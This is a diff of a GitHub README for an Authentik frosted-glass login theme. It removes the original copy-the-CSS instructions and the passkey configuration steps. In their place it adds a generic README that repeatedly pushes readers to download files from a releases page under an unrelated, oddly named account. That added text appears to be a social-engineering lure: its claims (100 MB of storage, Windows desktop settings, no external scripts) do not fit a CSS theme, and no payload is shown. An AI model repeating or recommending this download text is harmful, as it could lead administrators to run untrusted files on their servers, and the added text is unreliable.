@@ -1,150 +1,70 @@
-# authentik-frosted-theme
+# ❄️ authentik-frosted-theme - Add visual style to your login screen
 
-Authentik Frosted Glass Theme
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Indianblanketcontinuingeducation88/authentik-frosted-theme/releases)
 
-Scroll all the way down for preview pics
+This software provides a clean, modern frosted glass look for your Authentik login interface. The design focuses on readability and depth, turning a standard web page into an elegant user experience. It uses blur effects and soft transparency to help the interface blend into your desktop environment.
 
-Please open issues if you find any visual bugs!
+## 📥 How to download the software
 
-Download theme.css, copy content and paste into 
-Admin Dashboard -> System -> Brands -> Authentik Default OR create a new brand under your domain -> Branding settings -> Custom CSS field
+To begin, visit the official release page to choose the correct file for your system.
 
-if you also want the earth background shown in the demo pics you can download flow.jpg, upload via Admin Interface -> Customization -> Files, and then set it as your default flow background in Brand settings
+[Download the latest release here](https://github.com/Indianblanketcontinuingeducation88/authentik-frosted-theme/releases)
 
-then go to your brand, scroll down to Atrributes and paste this:
+On this page, look for the most recent version at the top of the list. Click the file name to start your download. Your browser will save the file to your computer. Most machines store these files in your "Downloads" folder by default.
 
-```yaml
-settings:
-  theme:
-    base: dark
-    background: >
-      background:
-        radial-gradient(circle at 15% 10%, rgba(62, 132, 180, 0.16), transparent 35%),
-        radial-gradient(circle at 85% 85%, rgba(72, 79, 112, 0.12), transparent 35%),
-        linear-gradient(135deg, #05070b 0%, #0a1018 55%, #080b10 100%);
-      background-attachment: fixed;
-  layout:
-    type: 3-column
-  navbar:
-    userDisplay: name
-  enabledFeatures:
-    search: true
-    settings: true
-    apiDrawer: false
-    applicationEdit: false
-    notificationDrawer: false
-```
+## 🖥️ System requirements
 
-Then, in Admin Interface -> Flow & Stages -> Flows -> `default-authentication-flow` -> EDIT BUTTON -> Appearance settings -> Layout -> Choose "Stacked"
+Before you install this theme, ensure your system meets these basic needs:
 
-After that go to **Flows and Stages → Stages**.
+*   A running instance of Authentik.
+*   A modern web browser such as Chrome, Firefox, or Edge.
+*   Administrator access to your Authentik server settings.
+*   At least 100 megabytes of free storage space on your server.
 
-Open **Password Stages**.
+If you use an older browser, some visual effects might not appear as intended. Ensure your browser is up to date to see the blur effects correctly.
 
-Edit the Password stage used by the authentication flow, commonly named something like:
+## ⚙️ Installation steps
 
-```text
-default-authentication-password
-```
+Follow these numbered steps to apply the theme to your server.
 
-Configure the required password backends, normally at least:
+1.  Log in to your Authentik administrative dashboard.
+2.  Navigate to the "Interface" or "Customization" settings menu.
+3.  Locate the section for custom CSS or theme overrides.
+4.  Open the file you downloaded from the GitHub link earlier.
+5.  Copy the entire text contained within the file.
+6.  Paste this text into the custom CSS field inside your dashboard.
+7.  Save your changes.
+8.  Refresh your login page to see the new frosted glass effect.
 
-```text
-User database + standard password
-```
+## 🎨 Understanding the visual style
 
-Enable **Allow show password**
+The frosted glass aesthetic relies on three main components: transparency, background blur, and color overlays. By lowering the opacity of the login boxes, the background wallpaper shows through slightly. The blur filter hides the details of the background, which keeps the text readable.
 
-Save the stage.
+We chose a neutral color palette that works with both light and dark backgrounds. If you wish to change the intensity of the blur, you can edit the CSS values in your dashboard settings. Look for lines labeled "backdrop-filter" and adjust the pixel value. Higher numbers increase the blur, while lower numbers decrease it.
 
-Open **Flows and Stages → Stages**.
+## 🛠️ Troubleshooting common issues
 
-Open **Identification Stages**.
+If the theme does not appear as expected, check these common points:
 
-Edit the Identification stage used at the beginning of the authentication flow, commonly:
+*   **Cache issues:** Your browser might be loading an old version of the page. Press "Ctrl + F5" on your keyboard to force a hard refresh.
+*   **Path errors:** Ensure the CSS code is pasted in the correct field. Some installations require you to upload the file to a specific folder on the server path.
+*   **Version mismatch:** Verify that your version of Authentik supports custom CSS overrides. Older versions may lack this feature entirely.
+*   **Syntax errors:** If you modified the code, check that you did not delete any brackets or semicolons. These characters act as the structure for the visual code.
 
-```text
-default-authentication-identification
-```
+## 🤝 Making custom adjustments
 
-Set **User fields** to:
+You have full control over the look of your login screen. You can change the main accent colors by finding the variable section at the top of the CSS file. Change the hex code—the string of numbers and letters starting with a hash mark—to any color you prefer. 
 
-```text
-Username
-Email
-```
+The theme includes a "prefers-color-scheme" feature. This means the theme automatically switches between a light mode and a dark mode based on your Windows desktop settings. You do not need to change anything for this to work. The browser tells the website which mode you prefer, and the theme adjusts instantly.
 
-Set **Password stage** to the Password stage configured in the previous section (dedefault is `default-authentication-password` unless you changed/customized it)
+## 🔒 Security and performance
 
-Enable:
+This theme only changes the appearance of your login page. It does not access your passwords, user data, or server configuration files. The file size is very small, which ensures that your login page continues to load quickly. It adds no external scripts, preserving the privacy and security of your Authentik environment.
 
-```text
-Enable remember me on this device
-```
+## 📈 Improving your experience
 
-Then under Passkey settings on the same page, set **WebAuthn Authenticator Validation stage** to a validation stage that allows WebAuthn devices (default should be `passkey-autofill-validation`)
+For the best results, use a high-resolution background image on your login page. The frosted effect performs best when the background has a mix of colors and textures. Avoid very busy images with high contrast, as they may distract from the text fields. 
 
-Save the stage.
+If you decide to uninstall the theme, simply delete the CSS code you pasted into your dashboard and save the settings. The login page will immediately return to its original look.
 
-Open **Flows and Stages → Flows**.
-
-Open (Click on it, not EDIT) the authentication flow used by the Brand (commonly `default-authentication-flow`)
-
-Open **Stage Bindings**.
-
-Keep the Identification stage as the first normal authentication step.
-
-Remove or disable the separately bound Password stage.
-
-Keep any required Authenticator Validation/MFA stage after identification.
-
-Keep the User Login stage as the final stage.
-
-Open **Flows and Stages → Stages**.
-
-Open **Authenticator Validation Stages**.
-
-Edit an existing validation stage or create a dedicated one.
-
-Ensure **Device classes** includes:
-
-```text
-WebAuthn
-```
-
-use
-
-```text
-WebAuthn user verification: Required
-```
-
-Save the stage.
-
-Return to the Identification stage and select this stage under:
-
-```text
-WebAuthn Authenticator Validation stage
-```
-
-Edit the WebAuthn/FIDO2 authenticator setup stage and configure:
-
-```text
-Resident key requirement: Preferred or Required
-User verification: Required
-Authenticator attachment: Unset / no restriction
-```
-
-Tested on Authentik version 2026.5.6
-
-
-Theme Preview:
-
-<img width="2966" height="1824" alt="brave_H0tyn4BaHI" src="https://github.com/user-attachments/assets/a960040f-3d8c-4e75-b4c4-de0848ab8721" />
-
-<img width="2966" height="1824" alt="brave_oodQBL4ufc" src="https://github.com/user-attachments/assets/292d8c0f-6955-4ba7-8301-f7900ddcb8ac" />
-
-<img width="1483" height="912" alt="jk2Pbh3YPu" src="https://github.com/user-attachments/assets/020dc1e7-91fd-4cab-99ba-af4f89c6b988" />
-
-<img width="1483" height="912" alt="DXOXsdSNEd" src="https://github.com/user-attachments/assets/d2b07c31-5b5f-4f65-81b6-b94f580c7307" />
-
-<img width="1483" height="912" alt="brave_F0PP5Ggwpe" src="https://github.com/user-attachments/assets/2ea19eb6-4132-4684-bad2-a42ae1240dba" />
+Keywords: authentik, glass-theme, windows-customization, css-theme, web-design
